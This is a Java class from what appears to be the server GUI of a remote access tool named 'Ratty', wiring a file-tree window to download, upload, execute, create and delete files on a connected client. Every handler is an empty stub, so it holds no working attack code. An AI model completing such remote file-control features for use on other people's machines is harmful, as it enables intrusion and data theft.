package de.sogomn.rat.server.gui;

import de.sogomn.rat.packet.IPacket;

final class FileTreeController implements ISubController {
	
	private ServerClient client;
	
	private FileTree fileTree;
	
	public FileTreeController(final ServerClient client) {
		this.client = client;
		
		fileTree = new FileTree();
		
		final String title = client.connection.getAddress();
		
		fileTree.addListener(this);
		fileTree.setTitle(title);
	}
	
	@Override
	public void userInput(final String command) {
		if (command == FileTree.REQUEST) {
			//...
		} else if (command == FileTree.DOWNLOAD) {
			//...
		} else if (command == FileTree.UPLOAD) {
			//...
		} else if (command == FileTree.EXECUTE) {
			//...
		} else if (command == FileTree.NEW_FOLDER) {
			//...
		} else if (command == FileTree.DELETE) {
			//...
		} else if (command == RattyGui.FILES) {
			//...
		}
	}
	
	@Override
	public void handlePacket(final IPacket packet) {
		//...
	}
	
}
